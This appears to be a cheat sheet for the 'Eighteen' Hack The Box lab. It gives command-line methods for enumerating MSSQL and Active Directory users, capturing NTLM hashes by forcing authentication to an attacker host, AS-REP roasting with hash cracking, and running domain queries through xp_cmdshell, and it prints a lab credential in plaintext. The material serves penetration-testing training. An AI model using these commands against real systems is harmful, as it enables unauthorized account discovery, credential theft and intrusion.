# MSSQL User Enumeration - Multiple Methods

## Method 1: Using Nmap NSE Script

The easiest method - uses nmap's built-in script:

```bash
# Basic MSSQL user enumeration
nmap -p 1433 --script ms-sql-ntlm-info 10.129.69.254

# More detailed enumeration
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config 10.129.69.254
```

## Method 2: Using Metasploit Module

```bash
msfconsole
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <TARGET_IP>
set USER_FILE /usr/share/wordlists/metasploit/common_users.txt
set BLANK_PASSWORDS true
set PASSWORD ""
run
```

Or for domain user enumeration:

```bash
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set RHOSTS <TARGET_IP>
set USERNAME <USERNAME>
set PASSWORD <PASSWORD>
run
```

## Method 3: MSSQL Error-Based User Enumeration

This technique exploits different error messages for valid vs invalid users:

```bash
# Install impacket if not already installed
pip install impacket

# Use mssqlclient.py to test users
mssqlclient.py DOMAIN/<username>:<password>@<TARGET_IP>

# Different error messages indicate:
# "Login failed for user '<username>'" = VALID USER, wrong password
# "Cannot find login matching" = INVALID USER
```

## Method 4: NetBIOS/SMB User Enumeration (for Windows users)

Since this is a Domain Controller, we can enumerate domain users:

```bash
# Using enum4linux
enum4linux -U <TARGET_IP>

# Using rpcclient (null session)
rpcclient -U "" -N <TARGET_IP>
> enumdomusers
> enumdomgroups
> queryuser <user>
> exit

# Using crackmapexec
crackmapexec smb <TARGET_IP> --users
crackmapexec smb <TARGET_IP> -u 'guest' -p '' --users
```

## Method 5: LDAP Enumeration (Domain Controller)

```bash
# Anonymous LDAP bind
ldapsearch -x -H ldap://<TARGET_IP> -b "dc=<domain>,dc=htb" "(objectClass=user)" sAMAccountName

# If anonymous fails, try with credentials
ldapsearch -x -H ldap://<TARGET_IP> -D "<user>@<host>" -w "<>" -b "dc=<domain>,dc=htb" "(objectClass=user)" sAMAccountName
```

## Method 6: Kerberos User Enumeration

```bash
# Using kerbrute (very fast, no passwords needed)
# Download from: https://github.com/ropnop/kerbrute

# Test if user exists via Kerberos
kerbrute userenum --dc <TARGET_IP> -d <domain> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

# Or test specific users
echo -e "user\nadministrator\nadmin\nguest" > test_users.txt
kerbrute userenum --dc <TARGET_IP> -d <domain> test_users.txt
```

## Method 7: MSSQL NTLM Hash Capture

Force MSSQL to authenticate to our machine and capture NTLM hashes:

```bash
# Start responder to capture hashes
sudo responder -I tun0

# From MSSQL (if we get access), trigger authentication:
# EXEC master..xp_dirtree '\\<your_ip>\share'
```

## Method 8: ASREPRoasting (No Password Required!)

If Kerberos pre-authentication is disabled for any users:

```bash
# Using impacket's GetNPUsers
GetNPUsers.py <domain>/ -dc-ip <TARGET_IP> -usersfile users.txt -no-pass

# If successful, crack the hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Recommended Approach for Eighteen HTB

Given what we know:
1. It's a Domain Controller (DC01)
2. We have kevin's credentials: `kevin:iNa2we6haRj2gaw!`
3. MSSQL port 1433 is open
4. SMB might be filtered

**Start with:**

### Step 1: Kerbrute (Fastest, No Auth Needed)
```bash
kerbrute userenum --dc <TARGET_IP> -d <domain> common_users.txt
```

### Step 2: Try kevin's credentials with MSSQL
```bash
mssqlclient.py <DOMAIN>/<user>:<password>!@<TARGET_IP>
```

### Step 3: If MSSQL access works, enumerate domain users
```sql
-- List all domain users (if xp_cmdshell is available)
EXEC xp_cmdshell 'net user /domain'
EXEC xp_cmdshell 'net group "Domain Users" /domain'
EXEC xp_cmdshell 'net group "Domain Admins" /domain'
```

### Step 4: Try to access SMB with kevin's credentials
```bash
crackmapexec smb <TARGET_IP> -u <user> -p '<password>' --users
smbclient -L //<TARGET_IP> -U <user>%<password>
```

## Quick One-Liner Tests

```bash
# Test kevin on MSSQL
mssqlclient.py <DOMAIN>/<user>:<password>@<TARGET_IP>

# Test kevin on WinRM
evil-winrm -i <TARGET_IP> -u <user> -p '<password>'

# Test kevin on SMB
smbclient -L //<TARGET_IP> -U <user>%<password>

# Kerbrute without credentials
kerbrute userenum --dc <TARGET_IP> -d <domain> users.txt
```

## Expected Output Patterns

**Valid User (wrong password):**
```
Login failed for user '<DOMAIN>\<user>'
```

**Invalid User:**
```
Cannot find a login matching the name provided
```

**Valid User (account disabled):**
```
The account is disabled
```

**Valid User (can't access database):**
```
Cannot open database requested by login
```
